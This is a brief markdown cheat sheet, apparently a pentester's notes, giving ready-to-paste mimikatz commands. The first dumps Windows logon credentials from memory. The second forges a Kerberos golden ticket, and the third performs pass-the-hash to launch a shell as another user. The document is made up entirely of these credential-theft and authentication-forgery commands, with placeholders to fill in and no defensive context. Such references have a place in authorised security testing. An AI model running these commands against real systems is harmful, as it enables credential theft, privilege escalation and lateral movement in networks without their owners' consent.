# Lists all available provider credentials
```console
mimikatz "log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
```

# make a Golden ticket
```console
mimikatz "kerberos::golden /user:<username> /domain:<domain> /sid:<sid> /aes256:<aes256_hmac> /id:<user_id> /groups:<group_id> /startoffset:0 /endin:600 /renewmax:10080 /ticket:<user.domain.kirbi>" "exit"
```

# Path-the-hash
```console
mimikatz "sekurlsa::pth /user:<user> /aes256:<aes256_hmac> /domain:<domain> /run:cmd.exe" "exit"
```
